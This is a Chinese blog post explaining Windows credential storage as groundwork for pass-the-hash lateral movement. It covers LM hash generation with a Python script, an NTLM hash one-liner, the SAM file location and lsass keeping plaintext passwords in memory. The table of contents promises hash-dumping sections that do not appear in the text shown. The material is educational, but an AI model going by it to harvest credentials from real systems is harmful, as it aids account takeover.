<!DOCTYPE html>
<html lang=zh>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="内网渗透–横向纵横1哈希传递（PTH）票据传递（PTT）委派攻击等，都是基于域环境下的认证机制来实现的。所以我们需要先了解一下windows的认证机制。 Hash的认识LM Hash简介LM(LAN Mannager) 协议使用的hash就叫做 LM Hash,比较容易破解。 自WindowsVista和Windows Server 2008开始,Windows取消LM hash。 LM Hash">
<meta property="og:type" content="article">
<meta property="og:title" content="内网学习--Metasploit使用">
<meta property="og:url" content="http://s1eady.top/2020/12/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F--%E6%A8%AA%E5%90%91%E7%BA%B5%E6%A8%AA1/index.html">
<meta property="og:site_name" content="steady&#39;s blog">
<meta property="og:description" content="内网渗透–横向纵横1哈希传递（PTH）票据传递（PTT）委派攻击等，都是基于域环境下的认证机制来实现的。所以我们需要先了解一下windows的认证机制。 Hash的认识LM Hash简介LM(LAN Mannager) 协议使用的hash就叫做 LM Hash,比较容易破解。 自WindowsVista和Windows Server 2008开始,Windows取消LM hash。 LM Hash">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201209111511447.png">
<meta property="article:published_time" content="2020-12-08T00:12:06.000Z">
<meta property="article:modified_time" content="2020-12-10T15:12:23.844Z">
<meta property="article:author" content="steady">
<meta property="article:tag" content="内网">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201209111511447.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>内网学习--Metasploit使用</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
      
<link rel="stylesheet" href="/css/rtl.css">

    
    <!-- rss -->
    
    
<meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="steady's blog" type="application/atom+xml">
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/about/">关于</a></li>
         
          <li><a href="/archives/">归档</a></li>
         
          <li><a href="/tags/">标签</a></li>
         
          <li><a href="/categories/">分类</a></li>
         
          <li><a href="/search/">搜索</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2020/12/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--windows%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%8E%E6%8F%90%E6%9D%83-(3)/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2020/11/30/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%85%8D%E6%9D%80%E6%80%BB%E7%BB%93/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">上一篇</span>
      <span id="i-next" class="info" style="display:none;">下一篇</span>
      <span id="i-top" class="info" style="display:none;">返回顶部</span>
      <span id="i-share" class="info" style="display:none;">分享文章</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://s1eady.top/2020/12/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F--%E6%A8%AA%E5%90%91%E7%BA%B5%E6%A8%AA1/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://s1eady.top/2020/12/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F--%E6%A8%AA%E5%90%91%E7%BA%B5%E6%A8%AA1/&text=内网学习--Metasploit使用"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://s1eady.top/2020/12/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F--%E6%A8%AA%E5%90%91%E7%BA%B5%E6%A8%AA1/&title=内网学习--Metasploit使用"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://s1eady.top/2020/12/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F--%E6%A8%AA%E5%90%91%E7%BA%B5%E6%A8%AA1/&is_video=false&description=内网学习--Metasploit使用"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=内网学习--Metasploit使用&body=Check out this article: http://s1eady.top/2020/12/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F--%E6%A8%AA%E5%90%91%E7%BA%B5%E6%A8%AA1/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://s1eady.top/2020/12/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F--%E6%A8%AA%E5%90%91%E7%BA%B5%E6%A8%AA1/&title=内网学习--Metasploit使用"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://s1eady.top/2020/12/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F--%E6%A8%AA%E5%90%91%E7%BA%B5%E6%A8%AA1/&title=内网学习--Metasploit使用"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://s1eady.top/2020/12/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F--%E6%A8%AA%E5%90%91%E7%BA%B5%E6%A8%AA1/&title=内网学习--Metasploit使用"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://s1eady.top/2020/12/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F--%E6%A8%AA%E5%90%91%E7%BA%B5%E6%A8%AA1/&title=内网学习--Metasploit使用"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://s1eady.top/2020/12/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F--%E6%A8%AA%E5%90%91%E7%BA%B5%E6%A8%AA1/&name=内网学习--Metasploit使用&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://s1eady.top/2020/12/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F--%E6%A8%AA%E5%90%91%E7%BA%B5%E6%A8%AA1/&t=内网学习--Metasploit使用"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E2%80%93%E6%A8%AA%E5%90%91%E7%BA%B5%E6%A8%AA1"><span class="toc-number">1.</span> <span class="toc-text">内网渗透–横向纵横1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Hash%E7%9A%84%E8%AE%A4%E8%AF%86"><span class="toc-number">1.1.</span> <span class="toc-text">Hash的认识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#LM-Hash"><span class="toc-number">1.1.1.</span> <span class="toc-text">LM Hash</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#LM-Hash%E7%94%9F%E6%88%90%E8%BF%87%E7%A8%8B"><span class="toc-number">1.1.1.2.</span> <span class="toc-text">LM Hash生成过程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#LM-Hash%E7%9A%84%E7%BC%BA%E7%82%B9"><span class="toc-number">1.1.1.3.</span> <span class="toc-text">LM Hash的缺点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E8%BF%87%E7%A8%8B"><span class="toc-number">1.1.1.4.</span> <span class="toc-text">生成过程</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NTLM-Hash"><span class="toc-number">1.1.2.</span> <span class="toc-text">NTLM Hash</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B-1"><span class="toc-number">1.1.2.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NTLM-Hash-%E7%94%9F%E6%88%90%E8%BF%87%E7%A8%8B"><span class="toc-number">1.1.2.2.</span> <span class="toc-text">NTLM Hash 生成过程</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WINDOWS%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6"><span class="toc-number">1.2.</span> <span class="toc-text">WINDOWS认证机制</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SAM"><span class="toc-number">1.2.1.</span> <span class="toc-text">SAM</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E8%AE%A4%E8%AF%81"><span class="toc-number">1.2.2.</span> <span class="toc-text">本地认证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E8%AE%A4%E8%AF%81-Net-NTLM"><span class="toc-number">1.2.3.</span> <span class="toc-text">网络认证 Net NTLM</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B7%A5%E4%BD%9C%E7%BB%84%E4%B8%AD"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">工作组中</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%AD"><span class="toc-number">1.2.3.2.</span> <span class="toc-text">域环境中</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E8%AE%A4%E8%AF%81%EF%BC%88Kerberos%EF%BC%89"><span class="toc-number">1.2.4.</span> <span class="toc-text">域认证（Kerberos）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92"><span class="toc-number">1.3.</span> <span class="toc-text">哈希传递</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows%E5%AF%86%E7%A0%81%E5%92%8C%E5%93%88%E5%B8%8C%E7%9A%84%E8%8E%B7%E5%8F%96"><span class="toc-number">1.3.1.</span> <span class="toc-text">Windows密码和哈希的获取</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%9F%9F%E5%86%85%E6%89%80%E6%9C%89%E7%94%A8%E6%88%B7hash"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">获取域内所有用户hash</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%99%BB%E5%BD%95%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E8%8E%B7%E5%8F%96hash"><span class="toc-number">1.3.1.1.1.</span> <span class="toc-text">登录域控制器获取hash</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%B7%E4%BD%A0%E5%8D%A1%E5%A7%BF%E8%8E%B7%E5%8F%96"><span class="toc-number">1.3.1.1.2.</span> <span class="toc-text">迷你卡姿获取</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#CS%E8%8E%B7%E5%8F%96"><span class="toc-number">1.3.1.1.3.</span> <span class="toc-text">CS获取</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%9C%AC%E6%9C%BA%E7%94%A8%E6%88%B7hash"><span class="toc-number">1.3.1.2.</span> <span class="toc-text">获取本机用户hash</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96lsass%E8%BF%9B%E7%A8%8B%E7%9A%84%E4%BF%A1%E6%81%AF"><span class="toc-number">1.3.1.2.1.</span> <span class="toc-text">读取lsass进程的信息</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96SAM%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">1.3.1.2.2.</span> <span class="toc-text">读取SAM数据库</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SAM%E8%A1%A8%E7%A6%BB%E7%BA%BF%E8%8E%B7%E5%8F%96hash"><span class="toc-number">1.3.1.2.3.</span> <span class="toc-text">SAM表离线获取hash</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BD%AC%E5%82%A8lsass%E8%BF%9B%E7%A8%8B%E7%A6%BB%E7%BA%BF%E8%8E%B7%E5%8F%96hash"><span class="toc-number">1.3.1.2.4.</span> <span class="toc-text">转储lsass进程离线获取hash</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Hash%E4%BC%A0%E9%80%92%E6%96%B9%E5%BC%8F"><span class="toc-number">1.3.2.</span> <span class="toc-text">Hash传递方式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Mimikatz-%E4%BA%A4%E4%BA%92%E5%BC%8F%E8%8E%B7%E5%8F%96"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">Mimikatz 交互式获取</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#impacket%E5%A5%97%E8%A3%85"><span class="toc-number">1.3.2.2.</span> <span class="toc-text">impacket套装</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pth%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">1.3.3.</span> <span class="toc-text">pth批量横向移动</span></a></li></ol></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        内网学习--Metasploit使用
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">steady</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2020-12-08T00:12:06.000Z" itemprop="datePublished">2020-12-08</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/">内网安全</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/%E5%86%85%E7%BD%91/" rel="tag">内网</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h1 id="内网渗透–横向纵横1"><a href="#内网渗透–横向纵横1" class="headerlink" title="内网渗透–横向纵横1"></a>内网渗透–横向纵横1</h1><p>哈希传递（PTH）票据传递（PTT）委派攻击等，都是基于域环境下的认证机制来实现的。所以我们需要先了解一下windows的认证机制。</p>
<h2 id="Hash的认识"><a href="#Hash的认识" class="headerlink" title="Hash的认识"></a>Hash的认识</h2><h3 id="LM-Hash"><a href="#LM-Hash" class="headerlink" title="LM Hash"></a>LM Hash</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>LM(LAN Mannager) 协议使用的hash就叫做 LM Hash,比较容易破解。</p>
<p><strong>自WindowsVista和Windows Server 2008开始,Windows取消LM hash。</strong></p>
<h4 id="LM-Hash生成过程"><a href="#LM-Hash生成过程" class="headerlink" title="LM Hash生成过程"></a>LM Hash生成过程</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">用户的密码被限制为最多14个字符。</span><br><span class="line">用户的密码转换为大写。</span><br><span class="line">密码转换为16进制字符串，不足14字节将会用0来再后面补全。</span><br><span class="line">密码的16进制字符串被分成两个7byte部分。每部分转换成比特流，并且长度位56bit，长度不足使用0在左边补齐长度，再分7bit为一组末尾加0，组成新的编码（str_to_key()函数处理）</span><br><span class="line">上步骤得到的8byte二组，分别作为DES key为&quot;KGS!@#$%&quot;进行加密。</span><br><span class="line">将二组DES加密后的编码拼接，得到最终LM HASH值。</span><br></pre></td></tr></table></figure>

<h4 id="LM-Hash的缺点"><a href="#LM-Hash的缺点" class="headerlink" title="LM Hash的缺点"></a>LM Hash的缺点</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">密码长度最大只能为14个字符</span><br><span class="line">密码不区分大小写(加密过程统一转换为大写,导致的)</span><br><span class="line">加密结果后16位为aad3b435b51404ee,则说明密码强度小于7位。(如果不够7位的话,后面需要用0来补全)</span><br></pre></td></tr></table></figure>

<h4 id="生成过程"><a href="#生成过程" class="headerlink" title="生成过程"></a>生成过程</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"># coding&#x3D;utf-8</span><br><span class="line">import base64</span><br><span class="line">import binascii</span><br><span class="line">from pyDes import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def DesEncrypt(str, Des_Key):</span><br><span class="line">    k &#x3D; des(Des_Key, ECB, pad&#x3D;None)</span><br><span class="line">    EncryptStr &#x3D; k.encrypt(str)</span><br><span class="line">    return binascii.b2a_hex(EncryptStr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def Zero_padding(str):</span><br><span class="line">    b &#x3D; []</span><br><span class="line">    l &#x3D; len(str)</span><br><span class="line">    num &#x3D; 0</span><br><span class="line">    for n in range(l):</span><br><span class="line">        if (num &lt; 8) and n % 7 &#x3D;&#x3D; 0:</span><br><span class="line">            b.append(str[n:n + 7] + &#39;0&#39;)</span><br><span class="line">            num &#x3D; num + 1</span><br><span class="line">    return &#39;&#39;.join(b)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line"></span><br><span class="line">    test_str &#x3D; &quot;123456&quot;</span><br><span class="line">    # 用户的密码转换为大写,并转换为16进制字符串</span><br><span class="line">    test_str &#x3D; test_str.upper().encode(&#39;hex&#39;)</span><br><span class="line">    str_len &#x3D; len(test_str)</span><br><span class="line"></span><br><span class="line">    # 密码不足14字节将会用0来补全</span><br><span class="line">    if str_len &lt; 28:</span><br><span class="line">        test_str &#x3D; test_str.ljust(28, &#39;0&#39;)</span><br><span class="line"></span><br><span class="line">    # 固定长度的密码被分成两个7byte部分</span><br><span class="line">    t_1 &#x3D; test_str[0:len(test_str) &#x2F; 2]</span><br><span class="line">    t_2 &#x3D; test_str[len(test_str) &#x2F; 2:]</span><br><span class="line"></span><br><span class="line">    # 每部分转换成比特流，并且长度位56bit，长度不足使用0在左边补齐长度</span><br><span class="line">    t_1 &#x3D; bin(int(t_1, 16)).lstrip(&#39;0b&#39;).rjust(56, &#39;0&#39;)</span><br><span class="line">    t_2 &#x3D; bin(int(t_2, 16)).lstrip(&#39;0b&#39;).rjust(56, &#39;0&#39;)</span><br><span class="line"></span><br><span class="line">    # 再分7bit为一组末尾加0，组成新的编码</span><br><span class="line">    t_1 &#x3D; Zero_padding(t_1)</span><br><span class="line">    t_2 &#x3D; Zero_padding(t_2)</span><br><span class="line">    print t_1</span><br><span class="line">    t_1 &#x3D; hex(int(t_1, 2))</span><br><span class="line">    t_2 &#x3D; hex(int(t_2, 2))</span><br><span class="line">    t_1 &#x3D; t_1[2:].rstrip(&#39;L&#39;)</span><br><span class="line">    t_2 &#x3D; t_2[2:].rstrip(&#39;L&#39;)</span><br><span class="line"></span><br><span class="line">    if &#39;0&#39; &#x3D;&#x3D; t_2:</span><br><span class="line">        t_2 &#x3D; &quot;0000000000000000&quot;</span><br><span class="line">    t_1 &#x3D; binascii.a2b_hex(t_1)</span><br><span class="line">    t_2 &#x3D; binascii.a2b_hex(t_2)</span><br><span class="line"></span><br><span class="line">    # 上步骤得到的8byte二组，分别作为DES key为&quot;KGS!@#$%&quot;进行加密。</span><br><span class="line">    LM_1 &#x3D; DesEncrypt(&quot;KGS!@#$%&quot;, t_1)</span><br><span class="line">    LM_2 &#x3D; DesEncrypt(&quot;KGS!@#$%&quot;, t_2)</span><br><span class="line"></span><br><span class="line">    # 将二组DES加密后的编码拼接，得到最终LM HASH值。</span><br><span class="line">    LM &#x3D; LM_1 + LM_2</span><br><span class="line">    print LM</span><br></pre></td></tr></table></figure>

<h3 id="NTLM-Hash"><a href="#NTLM-Hash" class="headerlink" title="NTLM Hash"></a>NTLM Hash</h3><h4 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h4><p>NT LAN Manager(NTLM) 哈希是windows系统认可的另一种算法,用于替代古老的LM-Hash, 一般指Windows系统下Security Account Manager(SAM)中保存的用户密码的hash。在Windows Vista/Windows 7/Windows Server 2008以及后面的系统中，NTLM哈希算法是默认启用的。</p>
<h4 id="NTLM-Hash-生成过程"><a href="#NTLM-Hash-生成过程" class="headerlink" title="NTLM Hash 生成过程"></a>NTLM Hash 生成过程</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">先将用户密码转换为十六进制格式。</span><br><span class="line">将十六进制格式的密码进行Unicode编码。</span><br><span class="line">使用MD4摘要算法对Unicode编码数据进行Hash计算</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 -c &#39;import hashlib,binascii; print binascii.hexlify(hashlib.new(&quot;md4&quot;, &quot;admin&quot;.encode(&quot;utf-16le&quot;)).digest())&#39;</span><br></pre></td></tr></table></figure>



<h2 id="WINDOWS认证机制"><a href="#WINDOWS认证机制" class="headerlink" title="WINDOWS认证机制"></a>WINDOWS认证机制</h2><h3 id="SAM"><a href="#SAM" class="headerlink" title="SAM"></a>SAM</h3><p>SAM(Security Account Manager) 安全账户管理器是一个数据库文件，在Windows XP，Windows Vista,windows7-10用于存储用户的密码。他可以用来验证本地和远程用户。在windows 2000 sp4 开始,Active Dircetory 对远程用户进行身份验证。SAM使用加密措施来防止未经身份验证的用户访问系统。</p>
<p>用户密码以哈希格式存储在 注册表配置单元中(registry hive), 作为LM Hash or NTLM Hash。</p>
<p>这个文件可以在<code>%SystemRoot%/system32/config/SAM</code> 和 挂载在<code>HKLM/SAM</code>。</p>
<p>WIndows运行时无法移动或者复制SAM文件，因为Windows 内核获取并在SAM文件上保留了独占的文件系统锁，并且在操作系统关闭之前不会释放该锁。</p>
<p>为了提高针对破解的SAM数据库的安全性, Microsoft 在Windows NT 4.0 中引入了SYSKEY功能。该功能会使用密钥对存储在SAM中的所有本地账户的密码哈希值进行加密。可以通过<code>syskey</code>程序来启用它。</p>
<h3 id="本地认证"><a href="#本地认证" class="headerlink" title="本地认证"></a>本地认证</h3><p>生成NTLM Hash：</p>
<p>操作系统运行winlogon进程显示登陆界面，接收用户的输入，然后将输入密码交予给lsass进程，该进程会执行以下下操作：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">使用动态密钥对称加密的方式在内存缓存一份&quot;明文密码&quot;</span><br><span class="line">将密码转换成NTLM Hash</span><br></pre></td></tr></table></figure>

<p>哈希对比：</p>
<p>将用户输入的密码计算成NTLM Hash，然后与sam数据库<code>（%SystemRoot%\system32\config\sam）</code>中该用户的哈希比对。</p>
<p>相关数据文件在win的文件夹下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"> C:\Windows\System32\config 的目录</span><br><span class="line"></span><br><span class="line">2020&#x2F;12&#x2F;06  18:18    &lt;DIR&gt;          .</span><br><span class="line">2020&#x2F;12&#x2F;06  18:18    &lt;DIR&gt;          ..</span><br><span class="line">2020&#x2F;12&#x2F;05  11:04           524,288 BBI</span><br><span class="line">2020&#x2F;12&#x2F;05  10:59            28,672 BCD-Template</span><br><span class="line">2020&#x2F;12&#x2F;06  18:18        29,097,984 COMPONENTS</span><br><span class="line">2020&#x2F;12&#x2F;05  11:04           524,288 DEFAULT</span><br><span class="line">2020&#x2F;12&#x2F;05  11:04         3,932,160 DRIVERS</span><br><span class="line">2020&#x2F;12&#x2F;05  11:00            32,768 ELAM</span><br><span class="line">2019&#x2F;03&#x2F;19  10:46    &lt;DIR&gt;          Journal</span><br><span class="line">2019&#x2F;03&#x2F;19  10:46    &lt;DIR&gt;          RegBack</span><br><span class="line">2020&#x2F;12&#x2F;05  11:04            65,536 SAM</span><br><span class="line">2020&#x2F;12&#x2F;05  11:04            32,768 SECURITY</span><br><span class="line">2020&#x2F;12&#x2F;05  11:04        46,661,632 SOFTWARE</span><br><span class="line">2020&#x2F;12&#x2F;05  11:04        10,485,760 SYSTEM</span><br><span class="line">2019&#x2F;03&#x2F;19  10:46    &lt;DIR&gt;          systemprofile</span><br><span class="line">2020&#x2F;12&#x2F;05  11:00    &lt;DIR&gt;          TxR</span><br><span class="line">              10 个文件     91,385,856 字节</span><br><span class="line">               6 个目录 44,029,734,912 可用字节</span><br></pre></td></tr></table></figure>

<p>NTLM哈希</p>
<p>单向哈希算法，Windows将用户的密码计算成NTLM哈希之后才存储在电脑中。</p>
<p>大致的运算流程为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用户密码-&gt;HEX编码-&gt;Unicode编码-&gt;MD4</span><br></pre></td></tr></table></figure>

<p>本地认证中用来处理用户输入密码的进程即lsass.exe,密码会在这个进程中明文保存，供该进程将密码计算成NTLM Hash与sam进行比对。</p>
